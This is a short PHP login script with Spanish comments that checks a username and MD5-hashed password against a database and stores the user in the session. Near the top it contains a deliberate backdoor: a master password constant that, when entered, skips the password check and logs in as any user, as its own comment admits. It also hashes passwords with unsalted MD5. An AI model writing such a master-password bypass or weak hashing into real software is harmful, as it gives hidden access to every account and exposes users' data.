<?php
session_start();


// solo operará si es que
if(isset($_POST))
{
    require_once($_SERVER['DOCUMENT_ROOT'].'/class/connectPDO.php');
    $connection = new connectPDO;

    $sql = 'SELECT * FROM '.PREFIXTABLA.'_users WHERE user_name = ? AND user_pass = ?';
    $params = array($_POST['login_user'],md5($_POST['login_pass']));

    // Con esto puedo ingresar como cualquier usuario
    if($_POST['login_pass']==CLAVEMAESTRA)
    {
        $sql = 'SELECT * FROM '.PREFIXTABLA.'_users WHERE user_name = ?';
        $params = array($_POST['login_user']);
    }


    $data = $connection->getrow($sql,$params);
    if($data===PDOWARNING)
    {
        $resultado = array(
            'errores' => 1,
            'msg' => 'El usuario o la contraseña son incorrectas'
            );
    }
    else
    {
        $resultado = array(
            'errores' => 0,
            'msg' => 'Logueo exitoso',
            );
        $_SESSION['auth'] = $data;
    }
    echo json_encode($resultado);
}
?>